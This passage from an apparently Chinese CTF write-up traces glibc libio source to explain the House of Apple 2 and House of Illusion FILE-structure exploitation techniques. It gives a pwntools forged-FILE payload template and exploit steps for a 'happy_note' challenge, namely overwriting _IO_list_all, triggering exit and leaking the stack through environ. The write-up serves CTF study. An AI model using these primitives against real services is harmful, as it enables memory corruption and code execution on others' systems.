(fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">	 required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">	 traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">	 not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">	 explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">	  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">	_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);		<span class="comment">// &lt;=</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,		<span class="comment">// &lt;=</span></span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">	fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">	 handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">	 unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure>
<p>注意在<code>_IO_new_file_underflow</code>中会调用<code>_IO_switch_to_get_mode</code>函数，这东西在<code>libio/genops.c:163</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_switch_to_get_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_OVERFLOW (fp, EOF) == EOF)	<span class="comment">// &lt;=</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_IO_read_base = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">	fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_IO_read_ptr = fp-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_switch_to_get_mode)</span><br></pre></td></tr></table></figure>
<p>其中又调用了<code>_IO_OVERFLOW</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">  <span class="keyword">if</span> (_IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br></pre></td></tr></table></figure>
<p>而现在<code>_IO_OVERFLOW</code>指向的是<code>_IO_new_file_underflow</code>，所以就会实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_OVERFLOW -&gt; _IO_new_file_underflow -&gt; _IO_switch_to_get_mode -&gt; _IO_OVERFLOW -&gt; _IO_new_file_underflow -&gt; ...</span><br></pre></td></tr></table></figure>
<p>的递归无限循环，于是就需要让<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>为假，防止进入<code>_IO_OVERFLOW</code></p>
<p>绕过后理论上让<code>_IO_OVERFLOW</code>指向<code>_IO_new_file_underflow</code>，就可以执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_SYSREAD(fp-&gt;_fileno, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</span><br></pre></td></tr></table></figure>
<p>但问题是，如果<code>_IO_OVERFLOW</code>指向<code>_IO_new_file_underflow</code>的话（比如<code>&amp;_IO_file_jumps + 0x8</code>），<code>_IO_SYSREAD</code>就会指向<code>_IO_new_file_write</code>，所以就只能执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(fp-&gt;_fileno, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</span><br></pre></td></tr></table></figure>
<p>导致失败</p>
<h4 id="House-of-Apple-2">House of Apple 2<a class="anchor" href="#House-of-Apple-2">·</a></h4>
<p>来看看 @CSOME <a target="_blank" rel="noopener" href="https://blog.csome.cc/p/house-of-some/">博客</a>中写的方法是怎么解决的</p>
<p>可以利用<code>House of Apple 2</code>的链，入口是<code>_IO_wfile_overflow</code>，在<code>libio/wfileops.c:406</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="keyword">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_wdoallocbuf (f);		<span class="comment">// &lt;=</span></span><br><span class="line">	  _IO_free_wbackup_area (f);</span><br><span class="line">	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_doallocbuf (f);</span><br><span class="line">	      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Otherwise must be currently reading.  If _IO_read_ptr</span></span><br><span class="line"><span class="comment">	     (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	     logically slide the buffer forwards one block (by setting</span></span><br><span class="line"><span class="comment">	     the read pointers to all point at the beginning of the</span></span><br><span class="line"><span class="comment">	     block).  This makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	     Otherwise, set the read pointers to _IO_read_end (leaving</span></span><br><span class="line"><span class="comment">	     that alone, so it can continue to correspond to the</span></span><br><span class="line"><span class="comment">	     external position). */</span></span><br><span class="line">	  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_read_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)</span><br><span class="line">	    &#123;</span><br><span class="line">	      f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">	      f-&gt;_wide_data-&gt;_IO_read_end = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">		f-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_ptr = f-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_base = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_wide_data-&gt;_IO_read_base = f-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">	f-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (wch == WEOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_flush (f);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)</span><br><span class="line">    <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  *f-&gt;_wide_data-&gt;_IO_write_ptr++ = wch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; wch == <span class="string">L&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">return</span> wch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wfile_overflow)</span><br></pre></td></tr></table></figure>
<p>其中调用了<code>_IO_wdoallocbuf</code>，在<code>libio/wgenops.c:364</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)	<span class="comment">// &lt;=</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure>
<p>调用了<code>_IO_WDOALLOCATE (fp)</code></p>
<p>在<a href="https://tover.xyz/p/PWN-Note-4-House-of-Some-2/">笔记vol.4</a>中学习了<code>House of Some 2</code>后，应该知道<code>vtable</code>和<code>_wide_vtable</code>是独立的，所以这里可以在不影响<code>vtable</code>的情况下，让<code>_IO_WDOALLOCATE</code>指向任意函数</p>
<p>于是就可以让<code>_IO_WDOALLOCATE</code>指向<code>_IO_new_file_underflow</code>，这样就可以在<code>_IO_SYSREAD</code>指向<code>_IO_file_read</code>的情况下调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(fp-&gt;_fileno, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</span><br></pre></td></tr></table></figure>
<p>合起来也就是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span> (<span class="keyword">int</span> status)</span><br><span class="line">&gt; __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>)</span><br><span class="line">==&gt; _IO_cleanup (<span class="keyword">void</span>)</span><br><span class="line">====&gt; _IO_flush_all_lockp (<span class="number">0</span>)             	<span class="comment">// for fp in _IO_list_all:</span></span><br><span class="line">======&gt; _IO_wfile_overflow (fp, EOF)      	<span class="comment">// _IO_OVERFLOW</span></span><br><span class="line">========&gt; _IO_wdoallocbuf (fp)</span><br><span class="line">==========&gt; _IO_new_file_underflow (fp)		<span class="comment">//_IO_WDOALLOCATE</span></span><br><span class="line">============&gt; read(fp-&gt;_fileno, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</span><br></pre></td></tr></table></figure>
<h4 id="House-of-Illusion">House of Illusion<a class="anchor" href="#House-of-Illusion">·</a></h4>
<p>如果看 @CSOME 的<a target="_blank" rel="noopener" href="https://github.com/CsomePro/Some-of-House/tree/44c61be9f2782576cbf76ef22f0433bbecea6d0d">最新Commit（目前是44c61be）</a>，会发现根本不是用<code>House of Apple 2</code>链打的，而是用<a target="_blank" rel="noopener" href="https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more">House of Illusion</a></p>
<p>先看看<code>_IO_file_finish</code>函数，在<code>libio/fileops.c:167</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_new_file_finish (FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_do_flush (fp);</span><br><span class="line">      <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))</span><br><span class="line">	_IO_SYSCLOSE (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_finish, _IO_file_finish)</span><br></pre></td></tr></table></figure>
<p>调用了<code>_IO_do_flush</code>和<code>_IO_SYSCLOSE</code></p>
<p>先看<code>_IO_do_flush</code>，在<code>libio/libioP.h:507</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0							      \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,				      \</span></span><br><span class="line"><span class="meta">		  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)		      \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,		      \</span></span><br><span class="line"><span class="meta">		   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr			      \</span></span><br><span class="line"><span class="meta">		    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure>
<p>也就是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_do_write(_f, (_f)-&gt;_IO_write_base, (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</span><br></pre></td></tr></table></figure>
<p>继续追进<code>_IO_do_write</code>，在上面<code>write</code>那一节有代码，里面会调用<code>_IO_SYSWRITE</code></p>
<p>如果让<code>_IO_OVERFLOW</code>指向<code>_IO_new_file_finish</code>的话（比如<code>&amp;_IO_file_jumps - 0x8</code>），那么就会调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_SYSWRITE(fp-&gt;_fileno, fp-&gt;_IO_write_base, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base)</span><br></pre></td></tr></table></figure>
<p>而如果<code>_IO_OVERFLOW</code>指向<code>_IO_new_file_finish</code>，那么<code>_IO_SYSWRITE</code>就是指向<code>_IO_file_read</code>，所以实际执行的是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(fp-&gt;_fileno, fp-&gt;_IO_write_base, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base)</span><br></pre></td></tr></table></figure>
<p>就实现了<code>read</code></p>
<p>最后还需要注意调用了<code>_IO_SYSCLOSE (fp)</code>，而这时<code>_IO_SYSCLOSE</code>指向的是<code>_IO_file_seek</code>，所以影响不大</p>
<h4 id="payload-2">payload<a class="anchor" href="#payload-2">·</a></h4>
<p>这里最好还是用<code>House of Illusion</code>去打，一个是没那么复杂，另一个是它的<code>payload</code>会短一点</p>
<p>PS：虽然<code>House of Apple 2</code>的构造一下也可以做到一样长，但是也挺麻烦的</p>
<p>给个参考的<code>payload</code>模板</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_template</span>(<span class="params">buf, nbytes, next_fp</span>):</span></span><br><span class="line">    <span class="comment"># read(fp-&gt;_fileno, fp-&gt;_IO_write_base, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base)</span></span><br><span class="line">    payload = flat(&#123;</span><br><span class="line">        <span class="number">0x10</span>: buf,                                      <span class="comment"># _IO_read_end   =&gt; in new_do_write,</span></span><br><span class="line">                                                        <span class="comment">#                   bypass fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</span></span><br><span class="line">        <span class="number">0x20</span>: buf,                                      <span class="comment"># _IO_write_base =&gt; read buf</span></span><br><span class="line">        <span class="number">0x28</span>: buf + nbytes,                             <span class="comment"># _IO_write_ptr  =&gt; read nbytes</span></span><br><span class="line">                                                        <span class="comment">#                   in _IO_flush_all_lockp,</span></span><br><span class="line">                                                        <span class="comment">#                   fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line">        <span class="number">0x68</span>: next_fp,                                  <span class="comment"># _chain</span></span><br><span class="line">        <span class="number">0x70</span>: <span class="number">0</span>,                                        <span class="comment"># _fileno        =&gt; read fd, stdin</span></span><br><span class="line">        <span class="number">0xc0</span>: <span class="number">0</span>,                                        <span class="comment"># _mode          =&gt; in _IO_flush_all_lockp,</span></span><br><span class="line">                                                        <span class="comment">#                   fp-&gt;_mode &lt;= 0</span></span><br><span class="line">        <span class="number">0xd8</span>: libc_IO_file_jumps - <span class="number">0x8</span>,                 <span class="comment"># vtable         =&gt; _IO_OVERFLOW -&gt; _IO_new_file_finish</span></span><br><span class="line">                                                        <span class="comment">#                =&gt; House of Illusion</span></span><br><span class="line">    &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
<h1 id="happy-note（revisit）">happy_note（revisit）<a class="anchor" href="#happy-note（revisit）">·</a></h1>
<p>最后再用这道题简单地过一下<code>House of Some 1</code>的流程</p>
<p>PS：可以结合下面<code>手动House of Some 1的Exp</code>一起看</p>
<h2 id="Part-1-写入fp0">Part.1 写入fp0<a class="anchor" href="#Part-1-写入fp0">·</a></h2>
<p>首先在前面已经泄露了<code>libc_base</code>，并且可以实现<code>0x200</code>字节的任意写</p>
<p>那么按照<code>House of Some 1</code>的思路，到这里应该是构造<code>read</code>的<code>fp0</code>，把<code>fp0</code>写到可控地址，然后把<code>_IO_list_all</code>改为<code>fp0</code>的地址，最后让程序返回或者执行<code>exit</code></p>
<p>先解决<code>exit</code>的问题，这个比较简单，在上面 漏洞点 里说了，<code>delete</code>里面有个<code>exit</code>函数，只要<code>delete</code>之前<code>delete</code>过的块就可以触发<code>exit</code></p>
<p>再来看<code>fp0</code>该怎么写，我的想法是，可以把<code>_IO_list_all</code>和<code>fp0</code>一起写，后面的<code>fp1</code>到<code>fp5</code>可以按顺序拼在<code>fp0</code>后面，大概是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iolist-0x10: 0              0</span><br><span class="line">iolist     : controled_addr 0</span><br><span class="line">iolist+0x10: fp0            ...</span><br><span class="line">... ...    : ...            ...</span><br><span class="line">&amp;fp0+0xe0  : fp1            ...</span><br><span class="line">... ...    : ...            ...</span><br><span class="line">&amp;fp1+0xe0  : fp2            ...</span><br><span class="line">... ...    : ...            ...</span><br></pre></td></tr></table></figure>
<p>在这一步要做的是通过<code>edit</code>往<code>iolist</code>写入<code>controled_addr</code>和<code>fp0</code></p>
<p>大概是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">controled_addr = libc_iolist + <span class="number">0x10</span></span><br><span class="line">fp_addr = [controled_addr + fp_length * i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"></span><br><span class="line">fp0 = read_template(fp_addr[<span class="number">1</span>], fp_length * <span class="number">2</span>, fp_addr[<span class="number">1</span>]) <span class="comment"># todo: read fp1 and fp2</span></span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(fp_addr[<span class="number">0</span>]) + p64(<span class="number">0</span>) + fp0)</span><br><span class="line">controled_addr += fp_length * <span class="number">2</span></span><br><span class="line">delete(<span class="number">3</span>)   <span class="comment"># exit</span></span><br></pre></td></tr></table></figure>
<h2 id="Part-2-泄露栈地址">Part.2 泄露栈地址<a class="anchor" href="#Part-2-泄露栈地址">·</a></h2>
<p>在执行到<code>fp0</code>的<code>_IO_OVERFLOW</code>后，就可以触发<code>read</code>写入<code>fp1</code>和<code>fp2</code></p>
<p>其中<code>fp1</code>做的是通过<code>libc</code>的<code>environ</code>泄露栈地址，执行到<code>fp1</code>的<code>_IO_OVERFLOW</code>后，可以触发<code>write</code>泄露<code>environ</code></p>
<p>这里有一个坑是，如果<code>exp</code>执行得比程序快的话（一半情况下都是），<code>recv</code> 捕获的就会是程序的历史输出，而不是泄露的栈地址</p>
<p>所以这之前应该加一个<code>r.recvuntil(b&quot;It's empty!\n&quot;)</code>把历史输出清空掉</p>
